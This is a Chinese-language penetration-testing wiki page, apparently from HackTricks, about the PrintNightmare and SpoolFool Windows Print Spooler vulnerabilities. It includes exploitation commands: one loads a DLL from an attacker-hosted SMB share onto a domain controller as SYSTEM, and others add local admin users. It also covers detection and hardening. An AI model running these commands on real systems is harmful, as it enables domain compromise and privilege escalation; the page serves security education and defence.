# PrintNightmare（Windows Print Spooler RCE/LPE）

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare 是 Windows **Print Spooler** 服务中一系列漏洞的统称，这些漏洞允许以 **SYSTEM 身份执行任意代码**；当 spooler 可通过 RPC 访问时，还允许在域控制器和文件服务器上进行**远程代码执行（RCE）**。被广泛利用的 CVE 主要包括 **CVE-2021-1675**（最初被归类为 LPE）和 **CVE-2021-34527**（完整的 RCE）。后续问题，例如 **CVE-2021-34481（“Point & Print”）** 和 **CVE-2022-21999（“SpoolFool”）**，表明其攻击面仍远未关闭。

如果你要查找的是通过 spooler 进行**认证强制 / relay**，而不是基于**驱动的 RCE/LPE**，请查看[此处关于 printer coercion abuse 的页面](printers-spooler-service-abuse.md)。本页面重点介绍以 **SYSTEM 身份加载驱动 / DLL**。

---

## 1. 易受攻击的组件与 CVE

| Year | CVE | Short name | Primitive | Notes |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|在 2021 年 6 月 CU 中修复，但被 CVE-2021-34527 绕过|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|`AddPrinterDriverEx` 允许已认证用户从远程共享加载驱动 DLL；2021 年 8 月之后，通常需要弱化 Point & Print 策略|
|2021|CVE-2021-34481|“Point & Print”|LPE|非管理员用户安装未签名驱动|
|2022|CVE-2022-21999|“SpoolFool”|LPE|创建任意目录 → DLL planting —— 在 2021 年补丁之后仍然有效|

所有这些漏洞都会滥用 **MS-RPRN / MS-PAR RPC methods**（`RpcAddPrinterDriver`、`RpcAddPrinterDriverEx`、`RpcAsyncAddPrinterDriver`）之一，或利用 **Point & Print** 内部的信任关系。

## 2. Exploitation techniques

### 2.1 远程攻陷域控制器（CVE-2021-34527）

已认证但**无特权**的域用户可以通过以下方式，在远程 spooler（通常是 DC）上以 **NT AUTHORITY\SYSTEM** 身份运行任意 DLL：
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
常见的 PoC 包括 **CVE-2021-1675.py**（Python/Impacket）、**SharpPrintNightmare.exe**（C#），以及 Benjamin Delpy 在 **mimikatz** 中的 `misc::printnightmare / lsa::addsid` modules。

### 2.2 本地提权（任意受支持的 Windows，2021-2024）

可以在**本地**调用同一个 API，从 `C:\Windows\System32\spool\drivers\x64\3\` 加载 driver，从而获得 SYSTEM privileges：
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 已修补主机上的现代 triage

在已完全更新的主机上，公开的 PrintNightmare PoC 通常会失败，因为 Windows 现在默认仅允许 **administrator** 安装 printer driver（自 2021 年 8 月 10 日起，`RestrictDriverInstallationToAdministrators=1`）。在对目标发起 exploit 之前，首先检查该环境是否为了 legacy printer 部署而回滚了这一安全更改：
```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```
通常，最值得关注的两个弱配置值是：

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

从 Linux 端运行 PoC 之前，先快速确认目标是否暴露了相关的 print RPC interfaces：
```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```
一些较新的公开工具还提供了更安全的 **check/list** 工作流，可在发送 DLL 之前使用：
```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```
> 如果低权限用户收到 `RPC_E_ACCESS_DENIED` (`0x8001011b`)，通常说明你遇到的是 2021 年之后的默认设置，而不是传输失败。

> 在 Windows 11 22H2+ 及更新的客户端版本中，远程打印默认使用 **RPC over TCP**，而 **RPC over named pipes** (`\PIPE\spoolss`) 默认被禁用，除非显式重新启用。一些较旧的 PoC 和实验环境笔记仍假设 named pipe 可访问。

### 2.4 在“已打补丁”网络中滥用 Package Point & Print

由于帮助台或 print-server 工作流仍要求非管理员用户安装或更新驱动，许多企业环境在最初的 2021 年补丁之后，仍因策略配置而**保持 vulnerable**。实际上，攻击方案通常变为：

- 如果完全禁用了安全提示，**classic arbitrary-DLL PrintNightmare** 仍然是最直接的路径。
- 如果启用了 `Only use Package Point and Print`，通常需要转向 **signed package-aware driver** 路径，而不是直接投放 raw DLL。
- 2024 年的研究表明，单独依赖 **`Package Point and Print - Approved servers` 并不是严格的信任边界**：如果攻击者能够 spoof 或 hijack 某个 approved print server 的 name resolution，受害者仍可能被重定向到能够满足策略检查的恶意服务器。
- 即使将 UNC hardening 与强制 **RPC-over-SMB** 结合使用，也可能不稳定，因为现代客户端可能会**回退到 RPC over TCP**。

因此，现代 PrintNightmare-style exploitation 通常更多是**滥用企业 printer deployment policy**，而不是原样重放最初的 2021 PoC。

### 2.5 SpoolFool (CVE-2022-21999) – 绕过 2021 年的修复

Microsoft 在 2021 年的补丁阻止了远程加载驱动，但**没有强化目录权限**。SpoolFool 滥用 `SpoolDirectory` 参数，在 `C:\Windows\System32\spool\drivers\` 下创建任意目录，投放 payload DLL，并强制 spooler 加载该 DLL：
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> 该 exploit 可在安装 2022 年 2 月更新之前的完全打补丁 Windows 7 → Windows 11 和 Server 2012R2 → 2022 上运行

---

## 3. 检测与 hunting

* **PrintService 日志** – 启用 *Microsoft-Windows-PrintService/Operational* channel，并监控 **Event ID 316**（已添加/更新驱动，通常包含 DLL 名称），同时关注成功和失败的尝试。将其与 **Event ID 808/811** 关联，用于发现可疑的 spooler module/driver load failures。
* **Sysmon** – 当父进程为 **spoolsv.exe** 时，监控 `C:\Windows\System32\spool\drivers\*` 内的 `Event ID 7`（Image loaded）或 `11/23`（File write/delete）。
* **Process lineage** – 每当 **spoolsv.exe** 生成 `cmd.exe`、`rundll32.exe`、PowerShell 或任何异常的 unsigned child process 时发出告警。
* **Network telemetry** – 监控 **spoolsv.exe** 向攻击者控制的 shares 发起的异常 SMB fetches，或本不应作为 print server 的服务器产生的异常 printer RPC traffic；两者都是高信号线索。

## 4. 缓解与 hardening

1. **Patch!** – 在每台安装了 Print Spooler service 的 Windows 主机上应用最新 cumulative update。
2. **在不需要 spooler 的位置禁用它**，尤其是在 Domain Controllers 上：
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **阻止 remote connections**，同时允许 local printing – Group Policy：`Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`。
4. **将 Point & Print 保持为仅管理员可用**，设置：
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
详细 guidance 见 Microsoft KB5005652
5. 如果业务要求迫使 `RestrictDriverInstallationToAdministrators=0`，则应将其他所有 printer policy 视为**仅部分缓解措施**。至少应优先使用 **package-aware drivers**，启用 **Only use Package Point and Print**，并将 **Package Point and Print - Approved servers** 限制为明确指定的 in-forest print servers。
6. **不要仅为修复失效的 printer mappings 而回退 printer RPC privacy**。将 `RpcAuthnLevelPrivacyEnabled=0` 设置为 0 的环境，实际上撤销了为 **CVE-2021-1678** 添加的 hardening，在 engagement 期间通常值得进行额外审查。

---

## 5. 相关 research / tools

* [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules) modules
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – 标准 Impacket implementation，支持 `-check`、`-list` 和 `-delete` modes
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – wrapper，内置 SMB delivery、multi-target support，以及 `MS-RPRN` / `MS-PAR` 两种 modes
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – 通过 package Point & Print 滥用 bring-your-own-vulnerable-printer-driver
* SpoolFool exploit 与 write-up
* 针对 SpoolFool 和其他 spooler bugs 的 0patch micropatches

如果你希望通过 spooler **coerce authentication**，而不是加载 driver，请跳转至 [printer spooler service abuse](printers-spooler-service-abuse.md)。

---

## References

* Microsoft – *KB5005652: Manage new Point & Print default driver installation behavior*
<https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872>
* Oliver Lyak – *SpoolFool: CVE-2022-21999*
<https://github.com/ly4k/SpoolFool>
* itm4n – *A Practical Guide to PrintNightmare in 2024*
<https://itm4n.github.io/printnightmare-exploitation/>
* itm4n – *The PrintNightmare is not Over Yet*
<https://itm4n.github.io/printnightmare-not-over/>
{{#include ../../banners/hacktricks-training.md}}
